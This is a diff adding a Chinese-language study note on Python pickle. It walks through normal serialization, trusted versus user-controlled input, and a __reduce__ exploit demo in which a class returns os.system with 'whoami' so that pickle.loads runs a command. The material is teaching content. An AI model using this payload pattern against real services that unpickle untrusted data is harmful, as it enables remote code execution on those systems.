@@ -1,0 +1,53 @@
+## 一、核心目标
+1.  复盘pickle序列化与反序列化基础语法
+2.  区分可信数据与用户可控数据的安全差异
+3.  巩固Python反序列化`__reduce__`漏洞核心利用代码
+4.  复盘往期漏洞相关请求脚本核心逻辑
+
+---
+
+## 二、代码实现与逐行解析
+
+### 习题1 基础复盘：Pickle 正常序列化/反序列化复现
+```python
+# 导入pickle模块，用于python对象序列化
+import pickle
+
+# 1.定义普通Python对象
+user_info = {"name":"test", "level":"user", "id":1001}
+
+# 2.序列化：对象转字节流（存储/传输格式）
+serialize_data = pickle.dumps(user_info)
+print("序列化后的字节数据：", serialize_data)
+
+# 3.反序列化：字节流还原为原对象
+unserialize_data = pickle.loads(serialize_data)
+print("反序列化还原对象：", unserialize_data)
+
+### 习题2 错题复盘：区分可控输入与安全输入差异
+import pickle
+
+# 安全场景：本地可信数据反序列化（无风险）
+safe_data = pickle.dumps({"msg":"safe data"})
+print("可信数据解析：", pickle.loads(safe_data))
+
+# 风险场景：模拟用户外部可控数据（漏洞核心前提）
+# 重点记忆：只要外部数据可控，就存在被构造恶意 payload 的风险
+user_control_data = input("模拟用户提交序列化数据：")
+print("用户可控数据接收完成")
+
+### 习题3 实战复盘：反序列化__reduce__漏洞核心演示
+import pickle
+import os
+
+# 核心知识点：__reduce__ 可自定义对象还原执行的函数
+class Exp:
+    # 漏洞关键魔术方法，反序列化自动触发
+    def __reduce__(self):
+        # 返回可执行系统命令的函数及参数
+        return (os.system, ("whoami",))
+
+# 构造恶意序列化payload
+evil_payload = pickle.dumps(Exp())
+# 反序列化触发命令执行（漏洞完整复现）
+pickle.loads(evil_payload)
